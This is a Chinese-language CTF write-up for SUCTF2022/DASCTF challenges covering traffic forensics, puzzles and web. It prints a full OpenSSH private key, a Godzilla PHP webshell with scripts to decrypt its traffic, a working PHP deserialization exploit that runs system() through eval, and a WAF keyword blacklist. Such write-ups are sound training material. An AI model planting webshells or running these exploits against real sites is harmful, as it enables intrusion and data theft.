# [SUCTF2022] WP


# Misc
## Hi hacker
下载到是一个流量包，分析tcp流，发现是一个后面执行命令的

![在这里插入图片描述](https://img-blog.csdnimg.cn/31f69f8f494c40a4938976798d58b400.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)

这里有一个文件jenkins_secret.zip

![在这里插入图片描述](https://img-blog.csdnimg.cn/f4c4a204b8b5494e80e0508db64ae52b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

看下一个包里面，他进行了这样的操作

![在这里插入图片描述](https://img-blog.csdnimg.cn/9c9b9bd91f384f7ba52a6bed07ac255c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)

这看起来像是把文件发送的一个作用

![在这里插入图片描述](https://img-blog.csdnimg.cn/97384b96e58343e89e91215735eaae25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)

分析icmp协议，找到这个secret文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/df754b54cb2b496d8479e51a5677dc96.png)

压缩文件是损坏的

![在这里插入图片描述](https://img-blog.csdnimg.cn/b46fa3603f3c4256ae1c2f9e13643924.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_13,color_FFFFFF,t_70,g_se,x_16)

binwalk分离一些，修复一下压缩包，总共就弄到了这些东西，还差了一些xml文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/52ad9b5d33854440a0cf137b740478d5.png)

这些应该是什么某种加密
这个是java的一个类似于插件的一个东西

```
org.jenkinsci.main.modules.instance_identity
```
github：https://github.com/jenkinsci/instance-identity-plugin

在github搜了一下，找到了几个对应的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/d1c6bbe128784ec7acd7a92e42bcf789.png)

找到了一个jenkins的解密的一个项目
https://github.com/hoto/jenkins-credentials-decryptor

![在这里插入图片描述](https://img-blog.csdnimg.cn/c97ad626cf0045a4b693c53247966a5e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这几个文件在流量包里都能找到，但是xml文件一直提取不出来
他发送是只是一个数据包，但是这里他分了四块去传输，这样数据混乱了，我无法将他们重新拼接起来，不知道是从哪里断的
找了一下规律，第一个应该是由PK来开头的，猜测数据应该是由这里开始

![在这里插入图片描述](https://img-blog.csdnimg.cn/6f43461b773548e691b3482b3220cd13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

每一个文件结尾都有个，猜测也是icmp传输的某个格式文本

![在这里插入图片描述](https://img-blog.csdnimg.cn/189ba30a3bbb4f80a3a727735990f798.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

而且只有最后第565个包里面是有压缩文件尾的，504b0506

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2a4cb64ad5044588c2e32fa704a142b.png)

所以我猜测是四个拼接起来合成完整的zip文件
我尝试和了一下，用winrar修复了一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/a085b0f18f994fb2a654cbacabcde722.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/df5cec5e4a6d4a55baaaa0c902bb2c9f.png)

差一个global_config.xml，而且xml文件还是处于损坏状态，无法提取。。。
脱出四个分块，放一起对比一下，相同的尾

![在这里插入图片描述](https://img-blog.csdnimg.cn/6fbd7cd96af644f180b97eb3edfe9dc1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3b2198d746da4379b69f4b50ee419d64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

拼了很久很久发现，漏了几个包
主要看这里

![在这里插入图片描述](https://img-blog.csdnimg.cn/c7d048ac764c492ba8b94f1c0b073d61.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

过滤一下`(icmp.ident == 135) && (ip.src == 172.17.0.2)`
把8个包的data流拿出来，去掉头部和尾部再拼接

![在这里插入图片描述](https://img-blog.csdnimg.cn/2c89bd2ed5614f51b1f5b02cdeb5ab1d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

终于得到了完好的压缩包，xml文件算是拿到了

![在这里插入图片描述](https://img-blog.csdnimg.cn/a431420fed634f3a8e061d81c84d709a.png)

然后就是用刚才的工具

![在这里插入图片描述](https://img-blog.csdnimg.cn/e6e67705c8424a57b3049fdebc2d18cf.png)

解密得到一个github是ssh私钥

![在这里插入图片描述](https://img-blog.csdnimg.cn/c3f852beac894a859c0e95c4b0a11430.png)

还有一个hint

![在这里插入图片描述](https://img-blog.csdnimg.cn/189c8cd2ba0d4102900488e45f62a69d.png)

这里获取了ssh的私钥

```php
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtzlKieML/0Tx0BJe15gk/afiGikfhN4FP7BSaqdP74gcjre/nAsI
Ydl/TOVDd9OpG7hwOTUZnITF9j/jzT32HIhek9oqxLFVQT59zqN1ZDIZmhSVMNRWqWw3/q
vF9OHneBShkC1r63g/W57chXU6Lg8jWyC+UycgAJOlsEPhuTb2mfD75h/Nq2++CDX3g72H
eHQFEJYqDYZmeQOmRV+GmNuVKWXnG0EkyT/MZ+0sqxU022eX4Nn5DhwKO79zfjpaAN9z9a
iCmVqeZLMVJZEuZ9s7MwrQ/tN8ov3lvG2QF5EafAoetgj1sKr65YnojT9K3Cn27S4Sl41I
PVJtCUOxGc9QUmjPH3L7h4Tfy8lPwyl65jWgx/BHDvuco3f0/jYFqw2xVEORwuED93MnaA
IooUY2hUAVAVupY3MaByn2cPnZa6Ujhs6jr2+UKQPfAysnIWA9Gnr/IH8xzzujt9Fg1zdl
qmirVsw+eKi070HbZbDtdKbV3ob/smaqZ6lnvKzXAAAFiNRQaKnUUGipAAAAB3NzaC1yc2
EAAAGBALc5SonjC/9E8dASXteYJP2n4hopH4TeBT+wUmqnT++IHI63v5wLCGHZf0zlQ3fT
qRu4cDk1GZyExfY/48099hyIXpPaKsSxVUE+fc6jdWQyGZoUlTDUVqlsN/6rxfTh53gUoZ
Ata+t4P1ue3IV1Oi4PI1sgvlMnIACTpbBD4bk29pnw++Yfzatvvgg194O9h3h0BRCWKg2G
ZnkDpkVfhpjblSll5xtBJMk/zGftLKsVNNtnl+DZ+Q4cCju/c346WgDfc/WogplanmSzFS
WRLmfbOzMK0P7TfKL95bxtkBeRGnwKHrYI9bCq+uWJ6I0/Stwp9u0uEpeNSD1SbQlDsRnP
UFJozx9y+4eE38vJT8MpeuY1oMfwRw77nKN39P42BasNsVRDkcLhA/dzJ2gCKKFGNoVAFQ
FbqWNzGgcp9nD52WulI4bOo69vlCkD3wMrJyFgPRp6/yB/Mc87o7fRYNc3Zapoq1bMPnio
tO9B22Ww7XSm1d6G/7JmqmepZ7ys1wAAAAMBAAEAAAGAO0ci0XeOgxj4LvwyiQflN9ef9B
zH4MG/6voNwAm/d9yOeLIEIOUE4jtuzx8Bc/wboydJz4hZb+UY8vF6rwVT4alRB/62hYpl
7cTdCQSjTzZSSCJOnkykeQ3VE+TZF8AaliP+nVnEp5rwzKCZ8eeaWhp1st7mFJr85JLgMS
XVGooowGdR6AL0FHoDfj6PhKTF9nd6yAH9OwD3mEFRAvLD5iJsoMciPRQXZbDpXdpC8Frd
Dfr3DT0YMbNqsCfhor4XoioPpufNisF1BFyx+Gv7M+qj7RW1RRfG5/LxRqCUx7eCjkPXr2
l777fOVsnOTcIEea9NTjdD/tacmvAgzj4jcMgnJmcQ46uAaQame1mPuanb8xMXj+Hmbtv3
Oet19bEmEuZiKOQuBPrwAhC/m2bhSPQyQcYbtfMVUCpakVp73y4+5o6CCx6sQJ4mCJZ25J
28AXC4tibWHJVtyceB8pP/KZri+vEaYfeCOVl756H8+QjrItlGs7BfDUa9cwwbGBThAAAA
wHSyot2RhNL4R6T0xFEMg8DT62U44IiME9xWZUnQ2xvjYApcLN4ekD8kWF+CLe64eMie2j
I/veZUjRj++va+1SEzXIPOZfq17xNRPr6IvOhiE1cG9EcmFyHEVRzDKP63qf7VhMkMYl2W
UENdNAjvv/QMlEXluhpFdOVVwp/5dtcXmU6tXZRtONsNbKAXRC9mdYVS/bueVRQ1EfVRo1
+iFzM+vIBbZsbrhGW1azJlwfBi3246NKdNhO8pgUnJ2Cb2vgAAAMEA31y2aFETbHi0jtdT
scjJ+MnFkwe2T84ryGNBuI5N+5N1ak8zBDf0FIicWisLdVHpZBReTnCvAhO8B2782HaLkp
beidDDsO7s34bixoIeAQ0nDpVEDh6EKAj3bKZu7O76Ka6YqpE/sHNBe7gS7ARFLTuqrZEN
G6LoGK3S+7p4kAiAfM6iK9X9tbdWt67zKGF3RjB0OZb1iuyBuQNo087DRkB/J227NXBzZ+
TazxuPVPPxM/tB6T89MQli0ZKkik/xAAAAwQDR/yBmgb9WnxmW3GpsVXd5tQM3pqOaQNoA
y5KrmkBznmEoNOoiTj5EG4jtoAZOdeh1FKePpxxANvGG4ehw2nSpHc+BZ4dcKLTI6qPbGp
rk0+bUPslUZOmdEEwo0RD8gmPrwowVsTkTzkDb/3IUDg8dMFWn5C+PGE27KD/XFUMC1RgD
xNWJwrLCER6DTbUceT54KTPgsOPJz0T9cNK0g0CjqobdiE5H2d16zORpOKdtYatfj9/FC3
RYExoL7yipkUcAAAANa2FsaUBFc29uaHVnaAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```
流量包里面，第一个http流里面有这样的信息



![](https://img-blog.csdnimg.cn/edeeb19a1cd04d2daf8d7608ea046c44.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)

所以接下来的目标就是利用这个私钥去拉取这个仓库
把私钥文件丢到~./ssh里面
然后用私钥去生成一个公钥

```php
ssh-keygen -y -f id_rsa > id_rsa.pub
```
然后就可以clone了
```php
git clone Esonhugh@github:Esonhugh/secret_source_code.git
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/36668b8687a24b67a7e5f64b9dee7926.png)

里面的文件就是http的第一个包的服务，没有flag，那就看一下git log，果然发现了端倪

![在这里插入图片描述](https://img-blog.csdnimg.cn/5beb99b8091e4c91affcb4ab466edb4b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16)

都看了一下，发现flag是在source1里面

![](https://img-blog.csdnimg.cn/1bc6af57511646f78a724d086646f1c0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_17,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/76e21b3cc32f41c3b81a006cc3b69e52.png)



DASCTF{Oh!_H4ck_f0r_c0d3s-and_4buse_1t}



## 月圆之夜
其实就是找一个映射的关系
比如机械师是mechanic，对应了他的字母，然后翻译出来对应回去就是了

![在这里插入图片描述](https://img-blog.csdnimg.cn/5a34a6b94a5b41d69d03764942303c4d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

mechanic

![在这里插入图片描述](https://img-blog.csdnimg.cn/58283126fef34daa9dbdfc31c287f988.png)

werewolf

![在这里插入图片描述](https://img-blog.csdnimg.cn/374191bfaf544df8a2aff830fda5dad1.png)

magician

![在这里插入图片描述](https://img-blog.csdnimg.cn/65429360175440579777f2d6b600312c.png)

knight

![在这里插入图片描述](https://img-blog.csdnimg.cn/563dbd3c011b45d98d14bd079abffccc.png)

soul hunter

![在这里插入图片描述](https://img-blog.csdnimg.cn/ec8d3d81040d4ac5b2de7fb350304820.png)

n

![在这里插入图片描述](https://img-blog.csdnimg.cn/4b85b40cf83f4425a7193fca47dccba7.png)

witch

![在这里插入图片描述](https://img-blog.csdnimg.cn/8b7c249e483a4e59bca4e1a4e6b2ed92.png)

nun

![在这里插入图片描述](https://img-blog.csdnimg.cn/d1f727671d654bdf811de45e20d381a8.png)

apothecary

![在这里插入图片描述](https://img-blog.csdnimg.cn/942a4e8ba9e9407988eb580f8254c5de.png)

Ranger

![在这里插入图片描述](https://img-blog.csdnimg.cn/b86c0cd3239e422ba8c3c1a4cdd9e350.png)

对比一下flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/57bc3d8487064f6db1a8a1e89fb37d5d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/d8a15be2b5164caea4c65c78f8d8345d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)

dasctf{welcometothefullmoonnight}

## 什么奇奇怪怪的东西
打开有一个mrf文件，MRF 文件是由 Bartels Media Mouse Recorder 创建的数据文件

还有一个flag.zip，里面有一个vhd文件，也被加密了

![在这里插入图片描述](https://img-blog.csdnimg.cn/62c32d5690284d3bb077168224c974b3.png)

在这里下载一个MouseRecorder
https://www.macrorecorder.com/download/
这里记录了一些鼠标操作记录

![在这里插入图片描述](https://img-blog.csdnimg.cn/78d21841883a4a909ad59810444b7e2b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

打开画图，然后让他画出来
结果是397643258669



![在这里插入图片描述](https://img-blog.csdnimg.cn/b6bafe2f513044c98e6d797bc02c4931.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

用这个密码去解开压缩包，拿到vhd文件，挂载上以后，里面有这么些文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/cae3d34c64a047d19b2af25c2324a35c.png)

ppt里面有这么一段字符

```
9876543210/.-,+*)E'CB;:?>=<;4Xyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONML
```
xlsx里面的内容

```php
KJIHGFED`B^]V[TYXWVUNrLQJONMLKDh+*)('&<A@?8=<;:92Vwvutsrqponmlkjihgfedcba`_^
```
txt里面的内容

```php
'&B$:?8=<;:3W76/4-Qrqponmlkjihgfedcbawv{zyxwvutsl2poQmle+LKJIHGcE[`YX]V[ZSw:
```
看这个图片的16进制，在末尾接了一段数据，是png的反转89054e74

![在这里插入图片描述](https://img-blog.csdnimg.cn/10b0b0d9299d4dd19d54972bea638d52.png)

提取出来反转一下，解出来是半个二维码

![在这里插入图片描述](https://img-blog.csdnimg.cn/7504d906522740d5836adefd09ff7302.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_10,color_FFFFFF,t_70,g_se,x_16)

原png的文件名解码是flag4

![在这里插入图片描述](https://img-blog.csdnimg.cn/66ff6adb90fa4cebb2628f97b33258a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)




## Au5t1n的秘密
中间有http流，貌似是扫描了一下目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/63e5ed588af44c69978d608b21ad396f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

在1994组里面，貌似是扫到了后台

![在这里插入图片描述](https://img-blog.csdnimg.cn/b0226c40ff6b45928e89c2996aa0dc72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里用admin:admin貌似登陆进去了

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b5831c11df6438e89034def93ae76d8.png)

进后台后进行了一个上传操作，这里提示了密钥是key is key1**

![在这里插入图片描述](https://img-blog.csdnimg.cn/61d5b8c67b4547d5bb3b6863c2e61e37.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)

传了文件名为key.php.mod
第二次上传

![在这里插入图片描述](https://img-blog.csdnimg.cn/276fd952482c4a3e9ee71c602ea66c30.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_19,color_FFFFFF,t_70,g_se,x_16)

内容是一个木马，didi.php，是一个哥斯拉马子，但是好像还改过

```php
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$payloadName='payload';
$key='093c1c388069b7e1';
$data=file_get_contents("php://input");
if ($data!==false){
    $data=encode($data,$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
		eval($payload);
        echo encode(@run($data),$key);
    }else{
        if (stripos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```
继续往后翻，找到对这个后面的利用了

![在这里插入图片描述](https://img-blog.csdnimg.cn/54daa06d6e194b25a7db27d04a0de578.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

被加密了，解一下哥斯拉的加密才行

![在这里插入图片描述](https://img-blog.csdnimg.cn/ddfe5ee047db47c898a9e87f99eb370e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_18,color_FFFFFF,t_70,g_se,x_16)

写一个脚本逆一下

```php
<?php
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}


$payloadName='payload';
$key='093c1c388069b7e1';
$data='1d430243025e5d4c55444a5f56174351401b4a0a6e391c6763736a5f56174351401b4a0a6e395e4d5e554d0b580b11424c5d4b15135e4b114b3b3342174511425c7
。
。（省略）
。
70657304a4b4c555b7f1759061919023e69114f726d2d75726c656e636f6465640d0a436f6e74656e742d4c656e6774683a2031390d0a0d0a545617590c5776595d533b66376531445c4017';
echo encode(hex2bin($data),$key);
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/118d47d25e7347ccb8e0427499d6c2fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)
解密拿到源码，这就是哥斯拉注入的一些东西，不用管

```php
$parameters=array(); $_SES=array(); function run($pms){ reDefSystemFunc(); $_SES=&getSession(); @session_start(); $sessioId=md5(session_id()); if (isset($_SESSION[$sessioId])){ $_SES=unserialize((S1MiwYYr(base64Decode($_SESSION[$sessioId],$sessioId),$sessioId))); } @session_write_close(); if (canCallGzipDecode()==1&&@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if 
。
。（省略）
。
strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }
```
再看看他其他的操作，这个流里面就是一些加载配置的操作了
后面的包，流量就解不出了，不知道为啥
他们有一个特征就是都有一个这样的头

![在这里插入图片描述](https://img-blog.csdnimg.cn/71c766859461418cbcdd245f7c4c3e6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_15,color_FFFFFF,t_70,g_se,x_16)

我怀疑是不是有一个什么格式，后来去了解了一下哥斯拉的木马，发现在Godzillas v3.03以后对发送以及返回流量增加了gzip压缩，我把脚本一改

```php
<?php
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}


$payloadName='payload';
$key='093c1c388069b7e1';
$data='';
echo bin2hex(encode(hex2bin($data),$key));
```
看一下文件头，哦豁，真是gzip压缩的格式

![在这里插入图片描述](https://img-blog.csdnimg.cn/14cd602b6c2b410e94ececd247c286fe.png)

这样就可以拉去`gzip -d`解压了

![在这里插入图片描述](https://img-blog.csdnimg.cn/99edd18009274466a8ab4a1505f05d0a.png)

解压出来，果然有数据！！

![](https://img-blog.csdnimg.cn/7109ea2f382c4e83b4385307201b03a3.png)

然后就可以去试了

![在这里插入图片描述](https://img-blog.csdnimg.cn/a6407cd3dbe944b7a28b2ff5ece9b754.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_16,color_FFFFFF,t_70,g_se,x_16)

在当前目录发现了flag.zip，时间还是2022的

![在这里插入图片描述](https://img-blog.csdnimg.cn/22f640c6d76a4c8385e9fefb9c3253dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_16,color_FFFFFF,t_70,g_se,x_16)

然后就是一个个的去试，在2079号包里面，找到了相关信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/4dfaaa78d2d94a8a8d92bc90d00ce153.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

上面的解密得到，这是他文件上传的表单，我们就可以拿下这个flag.zip了

![在这里插入图片描述](https://img-blog.csdnimg.cn/f524e2fa10244f9d86ba280aff8d5f4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_16,color_FFFFFF,t_70,g_se,x_16)

但是他有一个密码，密码为password is md5(Godzilla' key)，那找key就是最后的一步了
key进行md5后的前16位为

```
093c1c388069b7e1
```
写一个脚本爆破一下

```py
import string
import hashlib


def md5(s):
    return hashlib.md5(s.encode(encoding='utf-8')).hexdigest()
s = string.printable
k = 'key1'
for a in s:
    for b in s:
        for c in s:
            key = k+a+b+c
            if(md5(key)[0:16]=="093c1c388069b7e1"):
                print(key)
                break
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0f616dda632c471ea79cd67a1ca4fd23.png)

md5加密以后解开压缩包拿到flag

```php
093c1c388069b7e18bb4e898fc5ee049
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/552e069d79b747ff94d4612889a6b1f7.png)




# Web
## ezpop
题目给了如下代码
```php
<?php

class crow
{
    public $v1;
    public $v2;

    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;

    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' . $this->m1);
    }

}
```
入口的类肯定是fin，最后的目的肯定是在mix里面的get_flag方法里面去执行eval函数
get_flag的入口也在fin里面，是fin的`__call`函数，而能调用call的只有一个地方，就是crow的`__invoke`函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/45b482f0d0e447038f60d953c016513c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_13,color_FFFFFF,t_70,g_se,x_16)

那能调用invoke的地方这里就有很多了
fin里面的run方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/918bef65ebf9466fbfa909e58bd86d6d.png)

或者mix的run方法

![在这里插入图片描述](https://img-blog.csdnimg.cn/650bbd4838b44d3ba8ef757f729442e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_11,color_FFFFFF,t_70,g_se,x_16)

这里不知道从哪里开始分析，那就先看入口fin的`__destruct`函数，这里进行了一个字符串拼接，那么就是会触发一个`__toString`方法了
toString方法只有what有，那么f1的值就应该是what了

![在这里插入图片描述](https://img-blog.csdnimg.cn/7a9ba59d23724ab38b68850d098a8ee9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16)

这里进what的tostring以后会调用run方法，这里就有分支了，但是感觉两个都用得到，所以可能是利用了这个trick，[class,func]去跳转到crow的eval方法
一开始想着要把所有方法都连接上。所以这样想的

![在这里插入图片描述](https://img-blog.csdnimg.cn/bff5235ce9b747299909bdc7c1f5acd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)



```php
new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),"eval"])))
```
但是发现tostring会比析构还先执行，导致打不通，
然后发现是不是我想复杂了，直接用这个小trick连上get_flag方法就能直接执行了。。。

![在这里插入图片描述](https://img-blog.csdnimg.cn/925345aee3174921a73b059e8a0ce6a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里还耍我一轮

![在这里插入图片描述](https://img-blog.csdnimg.cn/4b7f6927b25f407dbde3732964428120.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

写马写不了
![在这里插入图片描述](https://img-blog.csdnimg.cn/81758215145a46b08584429d5b19b7d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

直接看当前目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/1f95fd95005b48ec89009ace001a308e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

这里又耍我一轮
![在这里插入图片描述](https://img-blog.csdnimg.cn/d99b0c9650334279b85fb169714bf77b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

拿到flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/2e984aaad40344c28278e058f251ebf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16)

最后的poc

```php
<?php

class crow
{
    public $v1;
    public $v2;
    public function __construct($a,$b){
        $this->v1 = $a;
        $this->v2 = $b;
    }
    function eval() {
        echo new $this->v1($this->v2);
    }

    public function __invoke()
    {
        $this->v1->world();
    }
}

class fin
{
    public $f1;
    public function __construct($a){
        $this->f1 = $a;
    }

    public function __destruct()
    {
        echo $this->f1 . '114514';
    }

    public function run()
    {
        ($this->f1)();
    }

    public function __call($a, $b)
    {
        echo $this->f1->get_flag();
    }

}

class what
{
    public $a;
    public function __construct($a){
        $this->a = $a;
    }

    public function __toString()
    {
        $this->a->run();
        return 'hello';
    }
}
class mix
{
    public $m1;
    public function __construct($a){
        $this->m1 = $a;
    }
    public function run()
    {
        ($this->m1)();
    }

    public function get_flag()
    {
        eval('#' .$this->m1);
    }

}

#$ser = new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),"eval"])));
$ser = new fin(new what(new fin([new mix('?><?php system("cat H0mvz*");?>'),'get_flag'])));
echo urlencode(serialize($ser));
```
## calc
题目给了源码

```php
#coding=utf-8
from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory
import random
from urllib import parse
import os
from werkzeug.utils import secure_filename
import time


app=Flask(__name__)

def waf(s):
    blacklist = ['import','(',')',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag= False
            print(no)
